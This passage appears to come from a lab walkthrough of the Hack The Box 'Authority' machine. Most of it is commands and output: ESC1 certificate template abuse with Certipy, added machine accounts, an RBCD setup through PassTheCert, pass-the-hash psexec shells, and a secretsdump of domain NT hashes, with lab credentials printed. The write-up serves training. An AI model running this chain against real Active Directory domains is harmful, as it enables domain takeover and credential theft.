Info: Uploading /home/kali/certify.exe to C:\Users\svc_ldap\Documents\certify.exe
                                        
Data: 238248 bytes of 238248 bytes copied
                                        
Info: Upload successful!
```

![Victim: svc_ldap](https://custom-icon-badges.demolab.com/badge/Victim-svc%5F_ldap-64b5f6?logo=windows11&logoColor=white)

`./certify.exe cas`:
```
   _____          _   _  __
  / ____|        | | (_)/ _|
 | |     ___ _ __| |_ _| |_ _   _
 | |    / _ \ '__| __| |  _| | | |
 | |___|  __/ |  | |_| | | | |_| |
  \_____\___|_|   \__|_|_|  \__, |
                             __/ |
                            |___./
  v1.1.0

[*] Action: Find certificate authorities
[*] Using the search base 'CN=Configuration,DC=authority,DC=htb'


[*] Root CAs

    Cert SubjectName              : CN=authority-AUTHORITY-CA, DC=authority, DC=htb ←
    Cert Thumbprint               : 094E898B8AEE105E36FFF9CF5042EC8192B1586C
    Cert Serial                   : 11F5D60BB25D8D83454427809BA02F17
    Cert Start Date               : 4/22/2023 11:03:30 PM
    Cert End Date                 : 4/22/2123 11:13:29 PM
    Cert Chain                    : CN=authority-AUTHORITY-CA,DC=authority,DC=htb

    Cert SubjectName              : CN=AUTHORITY-CA, DC=authority, DC=htb ←
    Cert Thumbprint               : 42A80DC79DD9CE76D032080B2F8B172BC29B0182
    Cert Serial                   : 2C4E1F3CA46BBDAF42A1DDE3EC33A6B4
    Cert Start Date               : 4/23/2023 9:46:26 PM
    Cert End Date                 : 4/23/2123 9:56:25 PM
    Cert Chain                    : CN=AUTHORITY-CA,DC=authority,DC=htb

    Cert SubjectName              : CN=htb-AUTHORITY-CA, DC=htb, DC=corp ←
    Cert Thumbprint               : E6BCCB9AF37AAB28E1711DFBB194BBB6F6ABDD0C
    Cert Serial                   : 348939AF0593949045AF6AE46A6CD886
    Cert Start Date               : 8/9/2022 6:55:57 PM
    Cert End Date                 : 8/9/2042 7:05:57 PM
    Cert Chain                    : CN=htb-AUTHORITY-CA,DC=htb,DC=corp



[*] NTAuthCertificates - Certificates that enable authentication:

    Cert SubjectName              : CN=AUTHORITY-CA, DC=authority, DC=htb
    Cert Thumbprint               : 42A80DC79DD9CE76D032080B2F8B172BC29B0182
    Cert Serial                   : 2C4E1F3CA46BBDAF42A1DDE3EC33A6B4
    Cert Start Date               : 4/23/2023 9:46:26 PM
    Cert End Date                 : 4/23/2123 9:56:25 PM
    Cert Chain                    : CN=AUTHORITY-CA,DC=authority,DC=htb

    Cert SubjectName              : CN=authority-AUTHORITY-CA, DC=authority, DC=htb
    Cert Thumbprint               : 094E898B8AEE105E36FFF9CF5042EC8192B1586C
    Cert Serial                   : 11F5D60BB25D8D83454427809BA02F17
    Cert Start Date               : 4/22/2023 11:03:30 PM
    Cert End Date                 : 4/22/2123 11:13:29 PM
    Cert Chain                    : CN=authority-AUTHORITY-CA,DC=authority,DC=htb

    Cert SubjectName              : CN=htb-AUTHORITY-CA, DC=htb, DC=corp
    Cert Thumbprint               : E6BCCB9AF37AAB28E1711DFBB194BBB6F6ABDD0C
    Cert Serial                   : 348939AF0593949045AF6AE46A6CD886
    Cert Start Date               : 8/9/2022 6:55:57 PM
    Cert End Date                 : 8/9/2042 7:05:57 PM
    Cert Chain                    : CN=htb-AUTHORITY-CA,DC=htb,DC=corp


[*] Enterprise/Enrollment CAs:

    Enterprise CA Name            : AUTHORITY-CA
    DNS Hostname                  : authority.authority.htb
    FullName                      : authority.authority.htb\AUTHORITY-CA
    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
    Cert SubjectName              : CN=AUTHORITY-CA, DC=authority, DC=htb
    Cert Thumbprint               : 42A80DC79DD9CE76D032080B2F8B172BC29B0182
    Cert Serial                   : 2C4E1F3CA46BBDAF42A1DDE3EC33A6B4
    Cert Start Date               : 4/23/2023 9:46:26 PM
    Cert End Date                 : 4/23/2123 9:56:25 PM
    Cert Chain                    : CN=AUTHORITY-CA,DC=authority,DC=htb
    UserSpecifiedSAN              : Disabled
    CA Permissions                :
      Owner: BUILTIN\Administrators        S-1-5-32-544

      Access Rights                                     Principal

      Allow  Enroll                                     NT AUTHORITY\Authenticated UsersS-1-5-11
      Allow  ManageCA, ManageCertificates               BUILTIN\Administrators        S-1-5-32-544
      Allow  ManageCA, ManageCertificates               HTB\Domain Admins             S-1-5-21-622327497-3269355298-2248959698-512
      Allow  ManageCA, ManageCertificates               HTB\Enterprise Admins         S-1-5-21-622327497-3269355298-2248959698-519
    Enrollment Agent Restrictions : None

    Enabled Certificate Templates:
        CorpVPN
        AuthorityLDAPS
        DirectoryEmailReplication
        DomainControllerAuthentication
        KerberosAuthentication
        EFSRecovery
        EFS
        DomainController
        WebServer
        Machine
        User
        SubCA
        Administrator



Certify completed in 00:00:23.3557404
```

`./certify.exe find /vulnerable`:
```
   _____          _   _  __
  / ____|        | | (_)/ _|
 | |     ___ _ __| |_ _| |_ _   _
 | |    / _ \ '__| __| |  _| | | |
 | |___|  __/ |  | |_| | | | |_| |
  \_____\___|_|   \__|_|_|  \__, |
                             __/ |
                            |___./
  v1.1.0

[*] Action: Find certificate templates
[*] Using the search base 'CN=Configuration,DC=authority,DC=htb'

[*] Listing info about the Enterprise CA 'AUTHORITY-CA'

    Enterprise CA Name            : AUTHORITY-CA ←
    DNS Hostname                  : authority.authority.htb
    FullName                      : authority.authority.htb\AUTHORITY-CA ←
    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
    Cert SubjectName              : CN=AUTHORITY-CA, DC=authority, DC=htb
    Cert Thumbprint               : 42A80DC79DD9CE76D032080B2F8B172BC29B0182
    Cert Serial                   : 2C4E1F3CA46BBDAF42A1DDE3EC33A6B4
    Cert Start Date               : 4/23/2023 9:46:26 PM
    Cert End Date                 : 4/23/2123 9:56:25 PM
    Cert Chain                    : CN=AUTHORITY-CA,DC=authority,DC=htb
    UserSpecifiedSAN              : Disabled
    CA Permissions                :
      Owner: BUILTIN\Administrators        S-1-5-32-544

      Access Rights                                     Principal

      Allow  Enroll                                     NT AUTHORITY\Authenticated UsersS-1-5-11
      Allow  ManageCA, ManageCertificates               BUILTIN\Administrators        S-1-5-32-544
      Allow  ManageCA, ManageCertificates               HTB\Domain Admins             S-1-5-21-622327497-3269355298-2248959698-512
      Allow  ManageCA, ManageCertificates               HTB\Enterprise Admins         S-1-5-21-622327497-3269355298-2248959698-519
    Enrollment Agent Restrictions : None

[!] Vulnerable Certificates Templates : ←

    CA Name                               : authority.authority.htb\AUTHORITY-CA ←
    Template Name                         : CorpVPN ←
    Schema Version                        : 2
    Validity Period                       : 20 years
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT ←
    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS, AUTO_ENROLLMENT_CHECK_USER_DS_CERTIFICATE
    Authorized Signatures Required        : 0 ←
    pkiextendedkeyusage                   : Client Authentication, Document Signing, Encrypting File System, IP security IKE intermediate, IP security user, KDC Authentication, Secure Email
    mspki-certificate-application-policy  : Client Authentication, Document Signing, Encrypting File System, IP security IKE intermediate, IP security user, KDC Authentication, Secure Email
    Permissions
      Enrollment Permissions
        Enrollment Rights           : HTB\Domain Admins             S-1-5-21-622327497-3269355298-2248959698-512
                                      HTB\Domain Computers          S-1-5-21-622327497-3269355298-2248959698-515
                                      HTB\Enterprise Admins         S-1-5-21-622327497-3269355298-2248959698-519
      Object Control Permissions
        Owner                       : HTB\Administrator             S-1-5-21-622327497-3269355298-2248959698-500
        WriteOwner Principals       : HTB\Administrator             S-1-5-21-622327497-3269355298-2248959698-500
                                      HTB\Domain Admins             S-1-5-21-622327497-3269355298-2248959698-512
                                      HTB\Enterprise Admins         S-1-5-21-622327497-3269355298-2248959698-519
        WriteDacl Principals        : HTB\Administrator             S-1-5-21-622327497-3269355298-2248959698-500
                                      HTB\Domain Admins             S-1-5-21-622327497-3269355298-2248959698-512
                                      HTB\Enterprise Admins         S-1-5-21-622327497-3269355298-2248959698-519
        WriteProperty Principals    : HTB\Administrator             S-1-5-21-622327497-3269355298-2248959698-500
                                      HTB\Domain Admins             S-1-5-21-622327497-3269355298-2248959698-512
                                      HTB\Enterprise Admins         S-1-5-21-622327497-3269355298-2248959698-519



Certify completed in 00:00:10.0804980
```

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

Since we previously noticed that `AD CS` was likely in use, let's try to use `certipy` to check for any vulnerable AD certificate templates.

`certipy-ad find -u 'svc_ldap' -p 'lDaP_1n_th3_cle4r!' -dc-ip 10.10.11.222 -stdout -vulnerable`:
```
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 37 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 13 enabled certificate templates
[*] Trying to get CA configuration for 'AUTHORITY-CA' via CSRA
[!] Got error while trying to get CA configuration for 'AUTHORITY-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
[*] Trying to get CA configuration for 'AUTHORITY-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Got CA configuration for 'AUTHORITY-CA'
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : AUTHORITY-CA ←
    DNS Name                            : authority.authority.htb
    Certificate Subject                 : CN=AUTHORITY-CA, DC=authority, DC=htb
    Certificate Serial Number           : 2C4E1F3CA46BBDAF42A1DDE3EC33A6B4
    Certificate Validity Start          : 2023-04-24 01:46:26+00:00
    Certificate Validity End            : 2123-04-24 01:56:25+00:00
    Web Enrollment                      : Disabled
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Permissions
      Owner                             : AUTHORITY.HTB\Administrators
      Access Rights
        ManageCertificates              : AUTHORITY.HTB\Administrators
                                          AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
        ManageCa                        : AUTHORITY.HTB\Administrators
                                          AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
        Enroll                          : AUTHORITY.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : CorpVPN ←
    Display Name                        : Corp VPN
    Certificate Authorities             : AUTHORITY-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : AutoEnrollmentCheckUserDsCertificate
                                          PublishToDs
                                          IncludeSymmetricAlgorithms
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Encrypting File System
                                          Secure Email
                                          Client Authentication
                                          Document Signing
                                          IP security IKE intermediate
                                          IP security use
                                          KDC Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 20 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : AUTHORITY.HTB\Domain Computers
                                          AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : AUTHORITY.HTB\Administrator
        Write Owner Principals          : AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
                                          AUTHORITY.HTB\Administrator
        Write Dacl Principals           : AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
                                          AUTHORITY.HTB\Administrator
        Write Property Principals       : AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
                                          AUTHORITY.HTB\Administrator
    [!] Vulnerabilities
      ESC1                              : 'AUTHORITY.HTB\\Domain Computers' can enroll, enrollee supplies subject and template allows client authentication ←
```

The output gives us some information about certificate templates and more specifically about a template called `CorpVPN`.

The `CorpVPN` certificate template allows all domain computers to enroll and is vulnerable to ESC1, which allows the enrolee to supply an arbitrary Subject Alternate Name (SAN). This means that we
can request a certificate on behalf of another user, such as a Domain Admin.

Before moving on, we need a computer account. We can confirm quickly that the `MachineAccountQuota` is set to the default value of `10`, so we should have no problem adding a computer account.

`netexec ldap 10.10.11.222 -L`:
```
LOW PRIVILEGE MODULES
[*] adcs                      Find PKI Enrollment Services in Active Directory and Certificate Templates Names
[*] daclread                  Read and backup the Discretionary Access Control List of objects. Be careful, this module cannot read the DACLS recursively, see more explanation in the options.
[*] enum_trusts               Extract all Trust Relationships, Trusting Direction, and Trust Transitivity
[*] find-computer             Finds computers in the domain via the provided text
[*] get-desc-users            Get description of the users. May contained password
[*] get-network               Query all DNS records with the corresponding IP from the domain.
[*] get-unixUserPassword      Get unixUserPassword attribute from all users in ldap
[*] get-userPassword          Get userPassword attribute from all users in ldap
[*] group-mem                 Retrieves all the members within a Group
[*] groupmembership           Query the groups to which a user belongs.
[*] laps                      Retrieves all LAPS passwords which the account has read permissions for.
[*] ldap-checker              Checks whether LDAP signing and binding are required and / or enforced
[*] maq                       Retrieves the MachineAccountQuota domain-level attribute ←
[*] obsolete                  Extract all obsolete operating systems from LDAP
[*] pre2k                     Identify pre-created computer accounts, save the results to a file, and obtain TGTs for each
[*] pso                       Module to get the Fine Grained Password Policy/PSOs
[*] sccm                      Find a SCCM infrastructure in the Active Directory
[*] subnets                   Retrieves the different Sites and Subnets of an Active Directory
[*] user-desc                 Get user descriptions stored in Active Directory
[*] whoami                    Get details of provided user

HIGH PRIVILEGE MODULES (requires admin privs)
```

`netexec ldap 10.10.11.222 -u 'svc_ldap' -p 'lDaP_1n_th3_cle4r!' -M maq`:
```
SMB         10.10.11.222    445    AUTHORITY        [*] Windows 10 / Server 2019 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (signing:True) (SMBv1:False)
LDAPS       10.10.11.222    636    AUTHORITY        [+] authority.htb\svc_ldap:lDaP_1n_th3_cle4r! 
MAQ         10.10.11.222    389    AUTHORITY        [*] Getting the MachineAccountQuota
MAQ         10.10.11.222    389    AUTHORITY        MachineAccountQuota: 10 ←
```

Having verified the `MachineAccountQuota`, we now add a computer account using `addcomputer.py` from `Impacket`.

`impacket-addcomputer 'authority.htb/svc_ldap:lDaP_1n_th3_cle4r!' -method LDAPS -computer-name 'FAKECOMPUTER' -computer-pass 'FakeComputer!' -dc-ip 10.10.11.222`:
```
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Successfully added machine account FAKECOMPUTER$ with password FakeComputer!. ←
```

Next, we use this computer account to request a certificate specifying the built-in domain `Administrator` account as the SAN.

`certipy-ad req -u 'FAKECOMPUTER' -p 'FakeComputer!' -dc-ip 10.10.11.222 -upn Administrator@authority.htb -ca AUTHORITY-CA -template CorpVPN`:
```
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error: The NETBIOS connection with the remote host timed out.
[-] Use -debug to print a stacktrace
```
❌

`certipy-ad req -u 'FAKECOMPUTER' -p 'FakeComputer!' -dc-ip 10.10.11.222 -upn Administrator@authority.htb -ca AUTHORITY-CA -template CorpVPN`:
```
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 4
[*] Got certificate with UPN 'Administrator@authority.htb'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator.pfx' ←
```

With the administrator's PFX file in our possession, we can now utilize it for authentication.

`file ./administrator.pfx`:
```
./administrator.pfx: data
```

We can try to use `certipy` with this `.pfx` certificate file to request a Kerberos TGT as the
domain `Administrator`. If everything goes right the tool will perform a Kerberos U2U (User-to-User authentication) for us and decrypt the NT hash from the Privilege Attribute Certificate (PAC) and we will then be able to use the NT hash to pass-the-hash and obtain administrator access.

`certipy-ad auth -pfx ./administrator.pfx`:
```
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@authority.htb
[*] Trying to get TGT...
[-] Got error while trying to request TGT: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
```
❌

`sudo ntpdate 10.10.11.222`:
```
2024-11-07 10:38:06.330056 (-0500) +14395.862512 +/- 0.033833 10.10.11.222 s1 no-leap
CLOCK: time stepped by 14395.862512
```

`certipy-ad auth -pfx ./administrator.pfx`:
```
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@authority.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@authority.htb': aad3b435b51404eeaad3b435b51404ee:6961f422924da90a6928197429eea4ed ←
```

`netexec smb 10.10.11.222 -u 'Administrator' -H '6961f422924da90a6928197429eea4ed'`:
```
SMB         10.10.11.222    445    AUTHORITY        [*] Windows 10 / Server 2019 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.222    445    AUTHORITY        [+] authority.htb\Administrator:6961f422924da90a6928197429eea4ed (Pwn3d!) ←
```

`netexec smb 10.10.11.222 -u 'Administrator' -H '6961f422924da90a6928197429eea4ed' --shares`:
```
SMB         10.10.11.222    445    AUTHORITY        [*] Windows 10 / Server 2019 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.222    445    AUTHORITY        [+] authority.htb\Administrator:6961f422924da90a6928197429eea4ed (Pwn3d!)
SMB         10.10.11.222    445    AUTHORITY        [*] Enumerated shares
SMB         10.10.11.222    445    AUTHORITY        Share           Permissions     Remark
SMB         10.10.11.222    445    AUTHORITY        -----           -----------     ------
SMB         10.10.11.222    445    AUTHORITY        ADMIN$          READ,WRITE ←     Remote Admin
SMB         10.10.11.222    445    AUTHORITY        C$              READ,WRITE      Default share
SMB         10.10.11.222    445    AUTHORITY        Department Shares READ,WRITE      
SMB         10.10.11.222    445    AUTHORITY        Development     READ,WRITE      
SMB         10.10.11.222    445    AUTHORITY        IPC$            READ            Remote IPC
SMB         10.10.11.222    445    AUTHORITY        NETLOGON        READ,WRITE      Logon server share 
SMB         10.10.11.222    445    AUTHORITY        SYSVOL          READ,WRITE      Logon server share
```

`netexec smb 10.10.11.222 -u 'Administrator' -H '6961f422924da90a6928197429eea4ed' -x 'whoami'`:
```
SMB         10.10.11.222    445    AUTHORITY        [*] Windows 10 / Server 2019 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.222    445    AUTHORITY        [+] authority.htb\Administrator:6961f422924da90a6928197429eea4ed (Pwn3d!)
SMB         10.10.11.222    445    AUTHORITY        [+] Executed command via wmiexec
SMB         10.10.11.222    445    AUTHORITY        htb\administrator ←
```

`impacket-psexec 'authority.htb/Administrator@10.10.11.222' -hashes ':6961f422924da90a6928197429eea4ed'`:
```
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 10.10.11.222.....
[*] Found writable share ADMIN$ ←
[*] Uploading file sBzXShQw.exe
[*] Opening SVCManager on 10.10.11.222.....
[*] Creating service GPcV on 10.10.11.222.....
[*] Starting service GPcV.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.4644]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

<🔄 Alternative Step>

`certipy-ad auth -pfx ./administrator.pfx`:
```
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Found multiple identifications in certificate
[*] Please select one:
[0] UPN: 'administrator@authority.htb'
[1] DNS Host Name: 'authority.htb'
> 0
[+] Trying to resolve 'authority.htb' at '8.8.8.8'
[*] Using principal: administrator@authority.htb
[*] Trying to get TGT...
[-] Got error while trying to request TGT: Kerberos SessionError:
KDC_ERR_PADATA_TYPE_NOSUPP(KDC has no support for padata type) ←
```
❌

We can get, instead, an error `KDC_ERR_PADATA_TYPE_NOSUPP(KDC has no support for padata type)`. This likely means that the target Domain Controller does not support `PKINIT`.

We can, however, use the `PassTheCert` tool to authenticate against LDAP using [Schannel (Secure Channel)](https://techcommunity.microsoft.com/t5/core-infrastructure-and-security/demystifying-schannel/ba-p/259233).

To use this tool, we first must extract the `.crt` and `.key` files from the `.pfx` certificate file using either `certipy` or `OpenSSL`.

`certipy-ad cert -pfx ./administrator.pfx -nocert -out ./administrator.key`:
```
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Writing private key to './administrator.key' ←
```

`certipy-ad cert -pfx ./administrator.pfx -nokey -out ./administrator.crt`:
```
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Writing certificate and  to './administrator.crt' ←
```

`file ./administrator.*`:
```
./administrator.crt:    PEM certificate ←
./administrator.key:    OpenSSH private key (no password) ←
./administrator.pfx:    data
```

Now, we can clone the tool from the GitHub repository.

`git clone https://github.com/AlmondOffSec/PassTheCert.git`:
```
Cloning into 'PassTheCert'...
remote: Enumerating objects: 155, done.
remote: Counting objects: 100% (33/33), done.
remote: Compressing objects: 100% (29/29), done.
remote: Total 155 (delta 7), reused 16 (delta 4), pack-reused 122 (from 1)
Receiving objects: 100% (155/155), 60.39 KiB | 242.00 KiB/s, done.
Resolving deltas: 100% (65/65), done.
```

`cd PassTheCert`

`cp ../administrator.crt ./`

`cp ../administrator.key ./`

`tree -L 2 ./`:
```
./
├── administrator.crt
├── administrator.key
├── C#
│   ├── PassTheCert
│   ├── PassTheCert.sln
│   └── README.md
├── LICENSE
├── Python
│   ├── passthecert.py ←
│   └── README.md
└── README.md

4 directories, 8 files
```

Now we can use the tool to give the computer account we control, namely `FAKECOMPUTER$`, te RBCD (Resource-Based Constrained Delegation), or the delegation rights over the DC.

`python3 ./Python/passthecert.py -dc-ip 10.10.11.222 -domain 'authority.htb' -port 636 -action ldap-shell -crt ./administrator.crt -key ./administrator.key`:
```
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

Type help for list of commands

# help

 add_computer computer [password] [nospns] - Adds a new computer to the domain with the specified password. If nospns is specified, computer will be created with only a single necessary HOST SPN. Requires LDAPS.
 rename_computer current_name new_name - Sets the SAMAccountName attribute on a computer object to a new value.
 add_user new_user [parent] - Creates a new user.
 add_user_to_group user group - Adds a user to a group. ←
 change_password user [password] - Attempt to change a given user's password. Requires LDAPS.
 clear_rbcd target - Clear the resource based constrained delegation configuration information.
 disable_account user - Disable the user's account.
 enable_account user - Enable the user's account.
 dump - Dumps the domain.
 search query [attributes,] - Search users and groups by name, distinguishedName and sAMAccountName.
 get_user_groups user - Retrieves all groups this user is a member of.
 get_group_users group - Retrieves all members of a group.
 get_laps_password computer - Retrieves the LAPS passwords associated with a given computer (sAMAccountName).
 grant_control target grantee - Grant full control of a given target object (sAMAccountName) to the grantee (sAMAccountName).
 set_dontreqpreauth user true/false - Set the don't require pre-authentication flag to true or false.
 set_rbcd target grantee - Grant the grantee (sAMAccountName) the ability to perform RBCD to the target (sAMAccountName).
 start_tls - Send a StartTLS command to upgrade from LDAP to LDAPS. Use this to bypass channel binding for operations necessitating an encrypted channel.
 write_gpo_dacl user gpoSID - Write a full control ACE to the gpo for the given user. The gpoSID must be entered surrounding by {}.
 whoami - get connected user
 dirsync - Dirsync requested attributes
 exit - Terminates this session.
```
```
# set_rbcd AUTHORITY$ FAKECOMPUTER$
Found Target DN: CN=AUTHORITY,OU=Domain Controllers,DC=authority,DC=htb
Target SID: S-1-5-21-622327497-3269355298-2248959698-1000

Found Grantee DN: CN=FAKECOMPUTER,CN=Computers,DC=authority,DC=htb
Grantee SID: S-1-5-21-622327497-3269355298-2248959698-11602
Delegation rights modified successfully!
FAKECOMPUTER$ can now impersonate users on AUTHORITY$ via S4U2Proxy ←
```

Next, we'll use `impacket-getST` to impersonate the `Administrator` account and grab a TGT.

`impacket-getST 'authority.htb/FAKECOMPUTER$:FakeComputer!' -spn 'cifs/authority.authority.htb' -impersonate 'Administrator'`:
```
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
```
❌

`sudo ntpdate 10.10.11.222`:
```
2024-11-07 19:41:15.050329 (+0100) +14396.009779 +/- 0.029261 10.10.11.222 s1 no-leap
CLOCK: time stepped by 14396.009779
```

`impacket-getST 'authority.htb/FAKECOMPUTER$:FakeComputer!' -spn 'cifs/authority.authority.htb' -impersonate 'Administrator'`:
```
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@cifs_authority.authority.htb@AUTHORITY.HTB.ccache ←
```

`mv ./Administrator@cifs_authority.authority.htb@AUTHORITY.HTB.ccache ./Administrator.ccache`

`KRB5CCNAME=./Administrator.ccache impacket-psexec 'Administrator@10.10.11.222' -k -no-pass`:
```
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[-] Kerberos SessionError: KDC_ERR_PREAUTH_FAILED(Pre-authentication information was invalid)
```
❌

`KRB5CCNAME=./Administrator.ccache impacket-psexec 'Administrator@authority.authority.htb' -k -no-pass`:
```
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[-] SMB SessionError: code: 0xc0000016 - STATUS_MORE_PROCESSING_REQUIRED - {Still Busy} The specified I/O request packet (IRP) cannot be disposed of because the I/O operation is not complete.
```
❌

`sudo ntpdate 10.10.11.222`:
```
2024-11-07 19:41:15.050329 (+0100) +14396.009779 +/- 0.029261 10.10.11.222 s1 no-leap
CLOCK: time stepped by 14396.009779
```

`KRB5CCNAME=./Administrator.ccache impacket-psexec 'Administrator@authority.authority.htb' -k -no-pass`:
```
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on authority.authority.htb.....
[*] Found writable share ADMIN$ ←
[*] Uploading file XvtiIZVn.exe
[*] Opening SVCManager on authority.authority.htb.....
[*] Creating service aESZ on authority.authority.htb.....
[*] Starting service aESZ.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.4644]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

Now we can also dump all the hashes.

`KRB5CCNAME=./Administrator.ccache impacket-secretsdump 'authority.htb/Administrator@authority.authority.htb' -k -no-pass -just-dc-ntlm`:
```
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Cleaning up... 
```
❌

`KRB5CCNAME=./Administrator.ccache impacket-secretsdump 'authority.htb/Administrator@authority.authority.htb' -k -no-pass -just-dc-ntlm -debug`:
```
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
[+] Using Kerberos Cache: ./Administrator.ccache
[+] Domain retrieved from CCache: authority.htb
[+] Returning cached credential for CIFS/AUTHORITY.AUTHORITY.HTB@AUTHORITY.HTB
[+] Using TGS from cache
[+] SMBConnection didn't work, hoping Kerberos will help (SMB SessionError: code: 0xc0000016 - STATUS_MORE_PROCESSING_REQUIRED - {Still Busy} The specified I/O request packet (IRP) cannot be disposed of because the I/O operation is not complete.) ←
[+] Exiting NTDSHashes.dump() because SMB SessionError: code: 0xc0000203 - STATUS_USER_SESSION_DELETED - The remote user session has been deleted.
[*] Cleaning up...
```
❌

`sudo ntpdate 10.10.11.222`:
```
2024-11-07 19:41:15.050329 (+0100) +14396.009779 +/- 0.029261 10.10.11.222 s1 no-leap
CLOCK: time stepped by 14396.009779
```

`KRB5CCNAME=./Administrator.ccache impacket-secretsdump 'authority.htb/Administrator@authority.authority.htb' -k -no-pass -just-dc-ntlm`:
```
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:6961f422924da90a6928197429eea4ed::: ←
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:bd6bd7fcab60ba569e3ed57c7c322908:::
svc_ldap:1601:aad3b435b51404eeaad3b435b51404ee:6839f4ed6c7e142fed7988a6c5d0c5f1:::
AUTHORITY$:1000:aad3b435b51404eeaad3b435b51404ee:6b817158dff39c232339454631a9b9da:::
[*] Cleaning up... 
```

<🔄 Alternative Step>

`python3 ./Python/passthecert.py -dc-ip 10.10.11.222 -domain 'authority.htb' -port 636 -action ldap-shell -crt ./administrator.crt -key ./administrator.key`:
```
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

Type help for list of commands

# help

 add_computer computer [password] [nospns] - Adds a new computer to the domain with the specified password. If nospns is specified, computer will be created with only a single necessary HOST SPN. Requires LDAPS.
 rename_computer current_name new_name - Sets the SAMAccountName attribute on a computer object to a new value.
 add_user new_user [parent] - Creates a new user.
 add_user_to_group user group - Adds a user to a group. ←
 change_password user [password] - Attempt to change a given user's password. Requires LDAPS.
 clear_rbcd target - Clear the resource based constrained delegation configuration information.
 disable_account user - Disable the user's account.
 enable_account user - Enable the user's account.
 dump - Dumps the domain.
 search query [attributes,] - Search users and groups by name, distinguishedName and sAMAccountName.
 get_user_groups user - Retrieves all groups this user is a member of.
 get_group_users group - Retrieves all members of a group.
 get_laps_password computer - Retrieves the LAPS passwords associated with a given computer (sAMAccountName).
 grant_control target grantee - Grant full control of a given target object (sAMAccountName) to the grantee (sAMAccountName).
 set_dontreqpreauth user true/false - Set the don't require pre-authentication flag to true or false.
 set_rbcd target grantee - Grant the grantee (sAMAccountName) the ability to perform RBCD to the target (sAMAccountName).
